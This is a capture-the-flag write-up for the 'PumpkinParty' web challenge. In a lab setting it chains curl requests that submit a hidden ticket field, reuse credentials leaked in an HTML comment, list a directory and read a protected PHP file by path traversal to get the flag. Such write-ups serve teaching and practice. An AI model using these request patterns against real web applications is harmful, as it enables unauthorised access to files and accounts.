## PumpkinParty
After we launched the container, we got an ip for the host. Let's call it `$HOSTIP`.

With `nmap $HOSTIP` we find out the host only listens on port 80.

Open that IP in a Web browser. It presents a page with a link at the bottom.
The link leads to a page for buying tickets, `/tickets.php`. It contains a form
with form fields for the number of tickets for each ticket type, e.g.
`normal\_count` or `vip\_count`.

The page's source code contains a comment which says that there's a fourth
ticket type 'merchant' which is not implemented yet. Since this type is not
included in the form we need to use `curl` to send a request with this ticket
type.

We used this command to submit the form with one merchant ticket:

    curl -i -H 'application/x-www-form-urlencoded' -F 'merchant_count=1' http://$HOSTIP/tickets.php?action=submit

The response is HTTP 302 that redirects to `?action=confirm` and has a
`Set-Cookie` header with the key `PHPSESSID`. We save it for later use.

    PHPSESSID=b3ec83b80e0774419f9269dce56b45ce

Following 'confirm' with

    curl -iv -b PHPSESSID=b3ec83b80e0774419f9269dce56b45ce -v http://$HOSTIP/tickets.php?action=confirm

returns a page with a table where the order is summarized. There's a button that sends a request to `?action=buy`.

Let's send a request:


    curl -iv -b PHPSESSID=b3ec83b80e0774419f9269dce56b45ce -v http://$HOSTIP/tickets.php?action=buy

We get a page with an HTML comment saying:

    <!-- @WEBDEVS user/pass merch_test2/BUYMYSHORTS !!!REMOVE IN PROD!!! -->

The question is: Where is this merchant page?

We guess and send

    curl -u merch_test2:BUYMYSHORTS -vi http://$HOSTIP/merchants/

The returned page contains JavaScript that iterates over the response of
`/merchants/processor.php?a=registered` to display merchant information.
For each value that is returned at this path another GET request to
`/merchants/processor.php?b=<MERCHANT>` is sent to get information about each
merchant.

    curl -u merch_test2:BUYMYSHORTS http://$HOSTIP/merchants/processor.php?a=registered

    ["Bobs Bar","Himalaya Hats","Ingrids Imbiss"]

What happens if we replace the value `registered` with something else, say, a dot?

    curl -u merch_test2:BUYMYSHORTS http://$HOSTIP/merchants/processor.php?a=.

It yields a list of filenames:

    [".htaccess",".htpasswd","327a6c4304ad5938eaf0efb6cc3e53dc.php","index.php","processor.php","registered"]

Apparently, `registered` is a directory and there's a suspicious file
`327a6c4304ad5938eaf0efb6cc3e53dc.php`, which is in the same directory as
`processor.php`.

However, accessing `/merchants/327a6c4304ad5938eaf0efb6cc3e53dc.php` returns a HTTP 403 (forbidden).

We need to look into this file.

Since the JavaScript code sends requests to
`/merchants/processor.php?b=<MERCHANT>` and the value of this parameter seems
to be file, we could get the suspicious file this way.

`processor.php` outputs files given in parameter `b` which are in the directory
`registered`. Since `327a6c4304ad5938eaf0efb6cc3e53dc.php` is in a directory above `registered` we need to send

    curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=../327a6c4304ad5938eaf0efb6cc3e53dc.php

The PHP file asks for a GET parameter `admin` that must have the value `sure`. So let's do the request

    curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/327a6c4304ad5938eaf0efb6cc3e53dc.php?admin=sure

The returned HTML page contains the flag: `DORF18{Y0UR\_5H3LL\_15\_1N\_4N0TH3R\_C45TL3}`.
